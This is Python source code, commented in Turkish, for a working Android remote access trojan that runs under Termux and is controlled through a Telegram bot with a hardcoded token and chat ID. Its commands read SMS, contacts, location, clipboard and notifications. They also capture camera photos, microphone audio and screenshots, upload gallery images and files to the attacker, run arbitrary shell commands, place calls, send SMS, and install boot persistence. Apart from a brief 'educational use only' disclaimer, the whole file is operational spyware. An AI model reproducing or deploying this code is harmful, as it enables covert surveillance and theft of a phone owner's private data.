# ============================================================================
# SİBERPAKET - TERMUX RAT (TELEGRAM C2)
# ============================================================================
# UYARI: Bu kod yalnızca eğitim amaçlıdır. Başkalarının sistemlerine izinsiz
# erişim yasaldışıdır. Kendi sistemlerinizde test ediniz.
# ============================================================================

import os
import sys
import json
import time
import subprocess
import base64
import threading
import requests
import re
from datetime import datetime

# ============================================================================
# YAPILANDIRMA
# ============================================================================
BOT_TOKEN = "8731815267:AAGe36W13g5xn3ic9Ubj2RxYW_ZK6baLGeM"
CHAT_ID = "7763831112"
API_URL = f"https://api.telegram.org/bot{BOT_TOKEN}"
LAST_UPDATE_ID = 0
RUNNING = True

# ============================================================================
# YARDIMCI FONKSİYONLAR
# ============================================================================
def log(msg):
    print(f"[{datetime.now().strftime('%H:%M:%S')}] {msg}")

def send_message(text):
    try:
        if len(text) > 4000:
            text = text[:4000] + "\n... (devamı var)"
        requests.post(f"{API_URL}/sendMessage", data={
            "chat_id": CHAT_ID,
            "text": text
        }, timeout=30)
    except Exception as e:
        log(f"Mesaj hatası: {e}")

def send_photo(file_path, caption=""):
    try:
        with open(file_path, "rb") as f:
            requests.post(f"{API_URL}/sendPhoto", data={
                "chat_id": CHAT_ID,
                "caption": caption
            }, files={"photo": f}, timeout=60)
    except Exception as e:
        log(f"Fotoğraf hatası: {e}")

def send_document(file_path, caption=""):
    try:
        with open(file_path, "rb") as f:
            requests.post(f"{API_URL}/sendDocument", data={
                "chat_id": CHAT_ID,
                "caption": caption
            }, files={"document": f}, timeout=60)
    except Exception as e:
        log(f"Dosya hatası: {e}")

def send_audio(file_path, caption=""):
    try:
        with open(file_path, "rb") as f:
            requests.post(f"{API_URL}/sendAudio", data={
                "chat_id": CHAT_ID,
                "caption": caption
            }, files={"audio": f}, timeout=60)
    except Exception as e:
        log(f"Ses hatası: {e}")

def get_updates():
    global LAST_UPDATE_ID
    try:
        r = requests.get(f"{API_URL}/getUpdates", params={
            "offset": LAST_UPDATE_ID + 1,
            "timeout": 30
        }, timeout=40)
        data = r.json()
        if data.get("ok"):
            return data.get("result", [])
    except Exception as e:
        log(f"Update hatası: {e}")
    return []

def shell(cmd):
    try:
        result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=30)
        return result.stdout + result.stderr
    except subprocess.TimeoutExpired:
        return "Komut zaman aşımı"
    except Exception as e:
        return f"Hata: {e}"

# ============================================================================
# KOMUT İŞLEYİCİ
# ============================================================================
def handle_command(cmd):
    global RUNNING
    parts = cmd.split(" ", 1)
    action = parts[0].lower()
    args = parts[1] if len(parts) > 1 else ""

    # /start, /help
    if action in ["/start", "/help"]:
        return HELP_MENU

    # /device
    elif action in ["/device", "/info"]:
        return f"""📱 Cihaz Bilgisi
Model: {shell('getprop ro.product.model').strip()}
Marka: {shell('getprop ro.product.brand').strip()}
Android: {shell('getprop ro.build.version.release').strip()}
SDK: {shell('getprop ro.build.version.sdk').strip()}
CPU: {shell('getprop ro.product.cpu.abi').strip()}"""

    # /sms
    elif action == "/sms":
        limit = args if args else "20"
        return shell(f"termux-sms-list -l {limit}")

    # /smssend <no> <mesaj>
    elif action == "/smssend":
        sp = args.split(" ", 1)
        if len(sp) < 2:
            return "Kullanım: /smssend <numara> <mesaj>"
        return shell(f"termux-sms-send -n {sp[0]} '{sp[1]}'")

    # /contacts
    elif action == "/contacts":
        return shell("termux-contact-list")

    # /location
    elif action in ["/location", "/gps"]:
        return shell("termux-location -p gps")

    # /camera [0/1]
    elif action == "/camera":
        cam = args if args else "0"
        path = f"/sdcard/DCIM/.cam_{int(time.time())}.jpg"
        shell(f"termux-camera-photo -c {cam} {path}")
        if os.path.exists(path):
            send_photo(path, f"📷 Kamera {cam}")
            os.remove(path)
            return "Fotoğraf gönderildi"
        return "Kamera hatası"

    # /mic <süre>
    elif action == "/mic":
        dur = args if args else "10"
        path = f"/sdcard/DCIM/.audio_{int(time.time())}.mp4"
        shell(f"termux-microphone-record -d {dur} -f {path}")
        time.sleep(int(dur) + 2)
        shell("termux-microphone-record -q")
        if os.path.exists(path):
            send_audio(path, f"🎤 Ses kaydı ({dur}s)")
            os.remove(path)
            return "Ses kaydı gönderildi"
        return "Mikrofon hatası"

    # /screenshot
    elif action == "/screenshot":
        path = f"/sdcard/DCIM/.screen_{int(time.time())}.png"
        shell(f"screencap -p {path}")
        if os.path.exists(path):
            send_photo(path, "📸 Ekran görüntüsü")
            os.remove(path)
            return "Ekran görüntüsü gönderildi"
        return "Ekran görüntüsü alınamadı"

    # /gallery [limit]
    elif action == "/gallery":
        limit = args if args else "10"
        result = shell(f"ls -t /sdcard/DCIM/Camera/ 2>/dev/null | head -{limit}")
        if not result.strip():
            result = shell(f"ls -t /sdcard/Pictures/ 2>/dev/null | head -{limit}")
        if not result.strip():
            result = shell(f"find /sdcard -type f \\( -name '*.jpg' -o -name '*.png' \\) 2>/dev/null | head -{limit}")
        if not result.strip():
            return "Galeride resim bulunamadı"
        return f"🖼️ Galeri ({limit} resim):\n\n{result}"

    # /galleryget <path>
    elif action == "/galleryget":
        if not args:
            return "Kullanım: /galleryget <resim_yolu>"
        if os.path.exists(args):
            send_photo(args, f"🖼️ {os.path.basename(args)}")
            return "Resim gönderildi"
        return f"Dosya bulunamadı: {args}"

    # /galleryall - tüm galeriyi gönder
    elif action == "/galleryall":
        limit = args if args else "5"
        result = shell(f"find /sdcard -type f \\( -name '*.jpg' -o -name '*.png' \\) 2>/dev/null | head -{limit}")
        if not result.strip():
            return "Galeride resim bulunamadı"
        for path in result.strip().split("\n"):
            if os.path.exists(path):
                send_photo(path, f"🖼️ {os.path.basename(path)}")
                time.sleep(1)
        return f"✅ {limit} resim gönderildi"

    # /files <path>
    elif action == "/files":
        path = args if args else "/sdcard"
        return shell(f"ls -la {path}")

    # /download <path>
    elif action == "/download":
        if not args:
            return "Kullanım: /download <dosya_yolu>"
        if os.path.exists(args):
            if os.path.getsize(args) < 50 * 1024 * 1024:
                send_document(args, f"📄 {os.path.basename(args)}")
                return "Dosya gönderildi"
            return "Dosya çok büyük (max 50MB)"
        return f"Dosya bulunamadı: {args}"

    # /read <path>
    elif action == "/read":
        if not args:
            return "Kullanım: /read <dosya_yolu>"
        try:
            return shell(f"cat {args}")[:4000]
        except:
            return "Dosya okunamadı"

    # /apps
    elif action == "/apps":
        return shell("pm list packages | sed 's/package://' | sort")

    # /clipboard
    elif action == "/clipboard":
        return shell("termux-clipboard-get")

    # /wifi
    elif action == "/wifi":
        return shell("termux-wifi-connectioninfo")

    # /battery
    elif action == "/battery":
        return shell("termux-battery-status")

    # /notifications
    elif action == "/notifications":
        return shell("termux-notification-list")

    # /torch
    elif action == "/torch":
        return shell("termux-torch on")

    # /vibrate
    elif action == "/vibrate":
        return shell("termux-vibrate -d 1000")

    # /tts <metin>
    elif action == "/tts":
        if args:
            shell(f"termux-tts-speak '{args}'")
            return "Seslendirildi"
        return "Kullanım: /tts <metin>"

    # /call <no>
    elif action == "/call":
        if args:
            shell(f"termux-telephony-call {args}")
            return f"Aranıyor: {args}"
        return "Kullanım: /call <numara>"

    # /shell <komut>
    elif action == "/shell":
        if args:
            return shell(args)
        return "Kullanım: /shell <komut>"

    # /persist
    elif action == "/persist":
        try:
            boot_dir = os.path.expanduser("~/.termux/boot")
            os.makedirs(boot_dir, exist_ok=True)
            script = os.path.join(boot_dir, "start_rat.sh")
            with open(script, "w") as f:
                f.write(f"#!/data/data/com.termux/files/usr/bin/bash\nnohup python {os.path.abspath(__file__)} > /dev/null 2>&1 &\n")
            os.chmod(script, 0o755)
            return f"✅ Kalıcılık sağlandı: {script}"
        except Exception as e:
            return f"Kalıcılık hatası: {e}"

    # /hide
    elif action == "/hide":
        return "Simge gizleme Termux'ta çalışmaz"

    # /root
    elif action == "/root":
        return shell("su -c id 2>&1 || echo 'Root yok'")

    # /exit
    elif action == "/exit":
        RUNNING = False
        return "Çıkış yapılıyor..."

    else:
        return f"Bilinmeyen komut: {action}\n/help yazın"

# ============================================================================
# YARDIM MENÜSÜ
# ============================================================================
HELP_MENU = """📋 SİBERPAKET KOMUTLARI

🔧 SİSTEM
/device - Cihaz bilgisi
/battery - Batarya durumu
/shell <komut> - Kabuk komutu
/root - Root kontrolü
/persist - Kalıcılık sağla
/torch - Flaş aç
/vibrate - Titret
/tts <metin> - Seslendir

📱 İLETİŞİM
/sms [limit] - SMS oku
/smssend <no> <mesaj> - SMS gönder
/contacts - Kişiler
/call <no> - Ara

📍 KONUM
/location - Konum
/gps - GPS konumu

📷 MEDYA
/camera [0/1] - Fotoğraf çek
/mic <süre> - Ses kaydı
/screenshot - Ekran görüntüsü

🖼️ GALERİ
/gallery [limit] - Galeri listesi
/galleryget <path> - Belirli resim
/galleryall [limit] - Tüm resimleri gönder

📁 DOSYA
/files <path> - Dosya listele
/download <path> - Dosya indir
/read <path> - Dosya oku
/apps - Uygulamalar
/clipboard - Pano

🌐 AĞ
/wifi - WiFi bilgisi
/notifications - Bildirimler

❌ ÇIKIŞ
/exit - Botu durdur"""

# ============================================================================
# ANA DÖNGÜ
# ============================================================================
def main():
    global LAST_UPDATE_ID, RUNNING
    log("SiberPaket başlatıldı")
    send_message(f"🚀 SiberPaket Aktif\n\n{shell('getprop ro.product.model').strip()}\nAndroid {shell('getprop ro.build.version.release').strip()}\n\n/help yazın")

    while RUNNING:
        try:
            updates = get_updates()
            for update in updates:
                LAST_UPDATE_ID = update["update_id"]
                if "message" in update and "text" in update["message"]:
                    msg = update["message"]
                    chat_id = str(msg["chat"]["id"])
                    text = msg["text"]
                    if chat_id == CHAT_ID:
                        log(f"Komut: {text}")
                        response = handle_command(text)
                        if response:
                            send_message(response)
        except Exception as e:
            log(f"Döngü hatası: {e}")
            time.sleep(5)

if __name__ == "__main__":
    main()
